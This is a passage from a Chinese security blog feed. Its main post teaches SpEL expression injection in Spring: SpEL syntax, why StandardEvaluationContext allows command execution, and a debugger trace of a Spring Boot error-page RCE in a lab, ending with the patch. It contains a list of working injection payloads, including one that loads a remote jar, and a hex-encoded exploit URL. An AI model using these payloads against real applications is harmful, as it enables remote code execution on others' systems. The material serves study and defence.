alt="image-20220331225034010"></p><p>继续查找<code>transformValue</code>方法是在哪被调用的，发现在put方法里会调用<code>transformValue</code>方法，从而导致<code>transformValue</code>调用<code>transform</code>方法去执行命令。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225502658-2009025010.png" alt="image-20220331225503104"></p><p>所以我们在调用<code>TransformedMap#decorate</code>方法绑定transformer之后，再调用put方法也可触发命令执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225850062-1350949135.png" alt="image-20220331225850271"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">https://www.cnblogs.com/nice0e3/p/13779857.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>SpEL表达式注入学习</title>
    <link href="https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-29T02:34:10.000Z</published>
    <updated>2022-03-29T15:03:43.874Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="什么是SpEL表达式"><a href="#什么是SpEL表达式" class="headerlink" title="什么是SpEL表达式"></a>什么是SpEL表达式</h3><p>Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。<br> Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p><span id="more"></span><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SpEL有三种用法，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><h4 id="1、-Value"><a href="#1、-Value" class="headerlink" title="1、@Value"></a>1、@Value</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class EmailSender &#123;</span><br><span class="line">    @Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br><span class="line">    private String mailUsername;</span><br><span class="line">    @Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)    </span><br><span class="line">    private String defaultLocale;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、bean配置"><a href="#2、bean配置" class="headerlink" title="2、bean配置"></a>2、bean配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;xxx&quot; class=&quot;com.java.XXXXX.xx&quot;&gt;</span><br><span class="line">    &lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">    &lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3、Expression"><a href="#3、Expression" class="headerlink" title="3、Expression"></a>3、Expression</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.ExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"> </span><br><span class="line">public class SpELTest &#123;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"> </span><br><span class="line">        //创建ExpressionParser解析表达式</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //表达式放置</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;表达式&quot;);</span><br><span class="line">        //执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br><span class="line">        Object value = exp.getValue();</span><br><span class="line">        </span><br><span class="line">        /**如果使用其他的容器，则用下面的方法*/</span><br><span class="line">        //创建一个虚拟的容器EvaluationContext</span><br><span class="line">        StandardEvaluationContext ctx = new StandardEvaluationContext();</span><br><span class="line">        //向容器内添加bean</span><br><span class="line">        BeanA beanA = new BeanA();</span><br><span class="line">        ctx.setVariable(&quot;bean_id&quot;, beanA);</span><br><span class="line">        </span><br><span class="line">        //setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br><span class="line">        ctx.setRootObject(XXX);</span><br><span class="line">        </span><br><span class="line">        //getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br><span class="line">        Object value = exp.getValue(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里接口<code>ExpressionParser</code>负责解析表达式字符串。上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。</p><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h4 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h4><ol><li>解析器<code>ExpressionParser</code>，用于将字符串表达式转换为<code>Expression</code>表达式对象。</li><li>表达式<code>Expression</code>，最后通过它的<code>getValute</code>方法对表达式进行计算取值。</li><li>上下文<code>EvaluationContext</code>，通过上下文对象结合表达式来计算最后的结果。</li></ol><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p><blockquote><p>引用其他对象:<code>#&#123;car&#125;</code><br>引用其他对象的属性：<code>#&#123;car.brand&#125;</code><br>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></p></blockquote><p>其中属性名称引用还可以用<code>$</code>符号 如：<code>$&#123;someProperty&#125;</code><br>除此以外在SpEL中，使用<code>T()</code>运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的<code>Math</code>类，我们可以像下面的示例这样使用<code>T()</code>运算符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Math)&#125; //结果会返回一个`java.lang.Math`类对象。</span><br></pre></td></tr></table></figure><h4 id="1、类表达式"><a href="#1、类表达式" class="headerlink" title="1、类表达式"></a>1、类表达式</h4><p>SpEL中可以使用特定的Java类型，经常用来访问Java类型中的静态属性或静态方法，需要用<code>T()</code>操作符进行声明。括号中需要包含类名的全限定名，也就是包名加上类名。唯一例外的是，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名。<br> 因此我们通过 <code>T()</code> 调用一个类的静态方法，它将返回一个 <code>Class Object</code>，然后再调用相应的方法或属性，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc.exe\&quot;)&quot;);</span><br><span class="line">        Object value = exp.getValue();</span><br></pre></td></tr></table></figure><h4 id="2、方法调用"><a href="#2、方法调用" class="headerlink" title="2、方法调用"></a>2、方法调用</h4><p>使用典型的Java编程语法来调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// string literal, evaluates to &quot;bc&quot;</span><br><span class="line">String c = parser.parseExpression(&quot;&#x27;abc&#x27;.substring(2, 3)&quot;).getValue(String.class);</span><br><span class="line"></span><br><span class="line">// evaluates to true</span><br><span class="line">boolean isMember = parser.parseExpression(&quot;isMember(&#x27;Mihajlo Pupin&#x27;)&quot;).getValue(societyContext,Boolean.class);</span><br></pre></td></tr></table></figure><h4 id="3、调用构造函数"><a href="#3、调用构造函数" class="headerlink" title="3、调用构造函数"></a>3、调用构造函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = </span><br><span class="line">  p.parseExpression(&quot;new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;,&#x27;German&#x27;)&quot;).getValue(Inventor.class);</span><br><span class="line"> </span><br><span class="line">//create new inventor instance within add method of List</span><br><span class="line">p.parseExpression(&quot;Members.add(new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;, &#x27;German&#x27;))&quot;).getValue(societyContext);</span><br></pre></td></tr></table></figure><h4 id="4、Bean引用"><a href="#4、Bean引用" class="headerlink" title="4、Bean引用"></a>4、Bean引用</h4><p>如果解析上下文已经配置，则可以使用<code>@</code>符号从表达式中查找bean。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser(); StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new MyBeanResolver()); </span><br><span class="line">// This will end up calling resolve(context,&quot;foo&quot;) on MyBeanResolver during evaluation </span><br><span class="line">Object bean = parser.parseExpression(&quot;@foo&quot;).getValue(context);</span><br></pre></td></tr></table></figure><h4 id="5、变量定义"><a href="#5、变量定义" class="headerlink" title="5、变量定义"></a>5、变量定义</h4><p>变量定义通过<code>EvaluationContext</code>接口的<code>setVariable(variableName, value)</code>方法定义；在表达式中使用<code>#variableName</code>引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象，使用<code>#root</code>引用根对象，使用<code>#this</code>引用当前上下文对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">EvaluationContext context = new StandardEvaluationContext(&quot;rui0&quot;);</span><br><span class="line">context.setVariable(&quot;variable&quot;, &quot;ruilin&quot;);</span><br><span class="line">String result1 = parser.parseExpression(&quot;#variable&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"> </span><br><span class="line">String result2 = parser.parseExpression(&quot;#root&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(&quot;#this&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure><h4 id="6、用户自定义的方法"><a href="#6、用户自定义的方法" class="headerlink" title="6、用户自定义的方法"></a>6、用户自定义的方法</h4><p>用户可以在SpEL注册自定义的方法，将该方法注册到<code>StandardEvaluationContext</code> 中的<code>registerFunction(String name, Method m)</code>方法。<br> 如：我们通过JAVA提供的接口实现字符串反转的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public abstract class StringUtils &#123;</span><br><span class="line"></span><br><span class="line">  public static String reverseString(String input) &#123;</span><br><span class="line">    StringBuilder backwards = new StringBuilder();</span><br><span class="line">    for (int i = 0; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - 1 - i));</span><br><span class="line">    &#125;</span><br><span class="line">    return backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过如下代码将方法注册到<code>StandardEvaluationContext</code>并且来使用它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">context.registerFunction(&quot;reverseString&quot;,                      StringUtils.class.getDeclaredMethod(&quot;reverseString&quot;,new Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(&quot;#reverseString(&#x27;hello&#x27;)&quot;).getValue(context, String.class);</span><br></pre></td></tr></table></figure><h4 id="7、模板表达式"><a href="#7、模板表达式" class="headerlink" title="7、模板表达式"></a>7、模板表达式</h4><p>表达式模板允许文字文本与一个或多个解析块的混合。 你可以每个解析块分隔前缀和后缀的字符。当然，常见的选择是使用<code>＃&#123;&#125;</code>作为分隔符，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">        &quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;,</span><br><span class="line">        new TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure><p>在<code>ParserContext</code>接口用于影响如何 表达被解析，以便支持所述表达模板的功能。的<code>TemplateParserContext</code>的定义如下所示</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png" alt="image-20220329142053427"></p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在不指定<code>EvaluationContext</code>的情况下默认采用的是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329144847462-176527755.png" alt="image-20220329144848681"></p><p>看下SpEL提供的两个<code>EvaluationContext</code>的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</span><br><span class="line">StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</span><br></pre></td></tr></table></figure><p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p><h3 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、$&#123;12*12&#125;</span><br><span class="line">2、T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)T(Thread).sleep(10000)</span><br><span class="line">3、#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br><span class="line">4、new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start()</span><br><span class="line">5、T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)</span><br><span class="line">6、T(Runtime).getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;)</span><br><span class="line">7、new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)</span><br><span class="line">8、new javax.script.ScriptEngineManager().getEngineByName(&quot;javascript&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)//调用ScriptEngine，js引擎名称可为[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</span><br><span class="line">9、new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://127.0.0.1:8999/Exp.jar&quot;)&#125;).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;127.0.0.1:2333&quot;)//URLClassLoader远程加载class文件，通过函数调用或者静态代码块</span><br><span class="line">10、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)  //AppClassLoader加载</span><br><span class="line">11、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.ProcessBuilder&quot;).getConstructors()[1].newInstance(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start() //AppClassLoader加载</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h4><p>原理</p><ul><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中 ${} 包围的内容都会被  <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的  <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ul><p>环境</p><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p><p>验证</p><p>请求<a href="http://127.0.0.1:9091/article?id=$%7B2*2%7D">http://127.0.0.1:9091/article?id=${2*2}</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329171117202-1289875588.png" alt="image-20220329171118750"></p><p>对执行的命令进行十六进制编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">target = &#x27;calc&#x27; # 自己这里是windows环境，所以测试命令用的是calc</span><br><span class="line">for x in target:</span><br><span class="line">    result += hex(ord(x)) + &quot;,&quot;</span><br><span class="line">print(result.rstrip(&#x27;,&#x27;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将字符串格式转换成 0x** java 字节形式，因为这里会将我们的payload中的单引号和双引号进行编码，导致SpEL表达式解析失败，所以为了方便执行任意代码，可以根据String类的特性传入byte数组：</p><p>分析过程参考：<a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125; </span><br></pre></td></tr></table></figure><p>开启调试，造成的原因主要是在<code>ErrorMvcAutoConfiguration.java</code>中的<code>SpelView</code>类，可以看到是在<code>this.helper.replacePlaceholders(this.template, this.resolver)</code>中生成了错误页面，然后返回给result并响应</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329184704655-640679280.png" alt="image-20220329184706224"></p><p>此时map的值如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329185821845-924507104.png" alt="image-20220329185823363"></p><p>其中template内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&#x27;created&#x27;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>跟进函数replacePlaceholders</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329190024398-1003926971.png" alt="image-20220329190025935"></p><p>继续跟进while循环中循环解析${}中的 表 达 式 ，例如第一个解析到${timestamp}的表达式</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212020428-2110315097.png" alt="image-20220329212021872"></p><p>然后通过resolvePlaceholder函数进行SpEL解析，跟进即可看到通过getValue方法对SpEL表达式进行解析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212531370-1367392607.png" alt="image-20220329212532940"></p><p>且<code>EvaluationContext</code>设置的为<code>StandardEvaluationContext</code>，根据前面我们可以知道它允许用户控制输入的情况下可以成功造成任意命令执行</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212843266-47854455.png" alt="image-20220329212845027"></p><p>当解析${message}时，我们跟踪下resolvePlaceholder函数，看看它是怎么处理的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329214604858-144904379.png" alt="image-20220329214605998"></p><p>通过getValue从Context从取出message的值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329215544902-59410262.png" alt="image-20220329215545883"></p><p>跟进</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220031215-1991450169.png" alt="image-20220329220033014"></p><p>就是对message的值进行html编码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220356553-1188508612.png" alt="image-20220329220358206"></p><p>编码完之后，可以看到message中的双引号被转换为html编码，所以这里编写命令执行的payload，不能带单引号和双引号，这也是为什么采用byte数组传递命令的原因了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220705475-2061816981.png" alt="image-20220329220705931"></p><p>接着往下就又是递归函数，获取proVal中${}中的值，然后进行SpEL表达式解析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221109578-1370501255.png" alt="image-20220329221111197"></p><p>往下，就是得到${}中的值，然后就是调用resolvePlaceholder进行解析</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221432770-915349157.png" alt="image-20220329221434377"></p><p>跟下，执行到getValue()方法就会对传进去SpEL恶意表达式进行解析，触发命令执行，弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221908395-113622263.png" alt="image-20220329221907429"></p><p>补丁是创建了一个新的<code>NonRecursivePropertyPlaceholderHelper</code>类，来防止递归解析路径中或者名字中含有的表达式。<br>详见： <a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p><a href="https://blog.csdn.net/qq_31481187/article/details/108025512">https://blog.csdn.net/qq_31481187/article/details/108025512</a></p><p><a href="https://xz.aliyun.com/t/9245#toc-11">https://xz.aliyun.com/t/9245#toc-11</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

